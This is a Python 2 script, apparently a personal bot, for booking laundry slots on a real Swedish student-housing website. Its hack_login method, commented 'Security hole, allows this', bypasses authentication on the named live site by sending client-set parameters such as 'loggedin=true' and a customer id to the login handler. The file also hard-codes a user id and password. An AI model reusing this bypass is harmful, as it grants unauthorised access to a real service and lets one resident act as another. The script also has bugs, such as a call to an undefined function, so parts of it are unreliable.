import urllib
import urllib2
import datetime
import cookielib

HEADERS = {
            'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0 Iceweasel/29.0.1',
            'Accept' :  '*/*',
            'Accept-Encoding' : 'utf-8',
          }

BOOK_URL="https://tvatta.sgsstudentbostader.se/wwwashwait.aspx"
CALENDAR_URL='https://tvatta.sgsstudentbostader.se/wwwashcalendar.aspx'
LOGIN_URL="https://www.sgsstudentbostader.se/Assets/Handlers/Momentum.ashx"

USER='122182'
PASS='1234'
#The ocject number of your apartment
OBJECT_NUMBER='503004325'

#Not sure what this means, maybe your aptus id? (seems to be static)
TYPE_ID=260685
#Probably this is the Id for Rotary (seems to be static)
GROUP_ID=267946
#uknown
PANEL_ID=48033


class SGS_bot:
    def __init__(self,algo):
        self.alogrithm = algo
        self.opener = self.create_opener()

    def create_opener(self):
        cj = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        opener.addheaders = HEADERS.items()
        urllib2.install_opener(opener)
        return opener

    def book(self):
        algorithm()

    def getDate(self,i):
        now =    datetime.datetime.now() + datetime.timedelta(days=i)
        return ('%i-%02i-%02i' % (now.year,now.month,now.day))

    def get_interval():
        now = datetime.datetime.now()
        return ((now.hour + 24 - 1) % 24) / 3

    def get_calendar(self,week_offset):
        values = {
            'panelId'    : str(PANEL_ID),
            'weekOffset' : str(week_offset),
            'type'       : str(TYPE_ID),
            'group'      : str(GROUP_ID)
             }
        url_values = urllib.urlencode(values)
        full_url = CALENDAR_URL + '?' + url_values
        data = self.opener.open(full_url)
        return data

    def login(self,opener):
        return NotImplemented

    #Security hole, allows this
    def hack_login(self):
        values = {'isresident': 'true',
              'loggedin'      : 'true',
              'customerid'    : USER,
              'tvattstuga'    : 'true',
              'customer_name' : OBJECT_NUMBER
             }
        url_values = urllib.urlencode(values)
        full_url = LOGIN_URL + '?' + url_values
        self.opener.open(full_url)
        self.opener.open('https://www.sgsstudentbostader.se/ext_gw.aspx?module=wwwash&lang=se?loggedin=true')
